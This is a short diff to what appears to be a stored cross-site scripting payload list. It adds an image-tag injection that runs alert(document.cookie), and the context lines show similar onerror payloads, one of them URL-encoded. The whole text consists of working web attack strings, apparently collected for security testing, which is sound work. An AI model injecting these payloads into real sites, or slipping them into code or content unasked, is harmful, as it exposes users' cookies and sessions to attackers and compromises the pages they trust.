@@ -13,6 +13,8 @@ Stored XSS
 
 "><img src=x onerror=alert(101)>
 
+"><img src=x onerror=alert(document.cookie)>
+
 "><<img onerror=alert(document.domain) src>
 
 %5C%22%3E%3C%3Cimg%20onerror%3Dalert%2855%29%20src%3E
